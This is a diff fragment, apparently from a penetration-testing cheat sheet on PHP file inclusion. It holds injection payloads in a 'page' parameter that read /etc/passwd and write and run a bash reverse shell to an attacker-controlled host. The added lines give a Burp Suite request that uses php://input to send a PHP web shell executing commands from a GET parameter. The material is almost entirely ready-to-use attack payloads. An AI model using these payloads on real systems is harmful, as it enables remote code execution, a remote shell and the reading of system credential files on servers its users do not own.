@@ -38,6 +38,23 @@ page=' and die(system('cat /etc/passwd')) or '
 page=' and die(system('echo '%2Fbin%2Fbash -i >%26 %2Fdev%2Ftcp%2F<attacker ip>%2F<attacker port> 0>%261' > %2Ftmp%2Frevshell.sh %26%26 chmod 777 %2Ftmp%2Frevshell.sh %26%26 %2Fbin%2Fbash %2Ftmp%2Frevshell.sh')) or '%0A
 ```
 
+Burp Suite
+
+```
+GET /site/index.php?page=php://input&cmd=id HTTP/1.1
+Host: 192.168.0.100
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=2vqr9cj4hp7d2uva04de1352ro
+Upgrade-Insecure-Requests: 1
+Content-Length: 41
+
+<?php echo shell_exec($_GET['cmd']); ?>
+```
+
 RFI
 
 - method1 
